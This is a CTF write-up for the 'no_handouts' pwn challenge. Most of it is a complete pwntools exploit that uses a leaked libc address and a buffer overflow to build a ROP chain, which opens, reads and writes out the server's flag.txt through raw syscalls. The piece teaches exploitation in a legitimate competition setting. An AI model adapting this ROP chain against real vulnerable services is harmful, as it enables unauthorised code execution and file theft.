https://ctftime.org/event/2449

# no_handouts (pwn)

I just found a way to kill ROP. I think. Maybe?

nc challs.pwnoh.io 13371

## Analysis

We are given `libc.so.6` and a libc leak. With these we can bypass ASLR and use ROP gadgets from libc.

From the Dockerfile it is supposed to be clear that there exists no `/bin/sh` on the remote. It was not clear to me that this was the case for some time.

Therefore we should not attempt to `execve` `/bin/sh` but rather to read the flag using syscalls.

## Solution

1) Locate the end of the `.bss` section of readable and writeable memory in libc
2) Write `flag.txt` - note how this is 8 bytes exactly - to an empty part of `.bss` - note how this should be followed by an already present zero byte after the write has completed
3) open/read/write the contents of `flag.txt` using syscalls

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("challs.pwnoh.io", 13371)

p.readuntil(b"it's at ")
leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["system"]
log.success(f"libc: {hex(libc.address)}")

p.readline()

# 0x00000000000bfc76 : mov qword ptr [rdi], rcx ; ret
GADGET_MOV_QWORD_PTR_RDI_RCX = p64(0x00000000000bfc76 + libc.address)

# 0x000000000003d1ee : pop rcx ; ret
GADGET_POP_RCX = p64(0x000000000003d1ee + libc.address)

BSS = p64(0x00228e30 + libc.address + 0x100)

rop = ROP(libc)
rop.raw(b"A" * 0x28)

rop.rdi = BSS
rop.raw(GADGET_POP_RCX)
rop.raw(b"flag.txt")
rop.raw(GADGET_MOV_QWORD_PTR_RDI_RCX)
rop.rsi = 0
rop.rdx = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 3
rop.rsi = BSS
rop.rdx = 43
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 1
rop.rsi = BSS
rop.rdx = 43
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

p.interactive() # bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}
```

### Note

The size used here is `43` this is arrived at through trial and error and should not be obvious until you have read the flag file from the disk. I started with `256` bytes or something much larger.

## Flag
`bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}`

smiley 2024/09/28
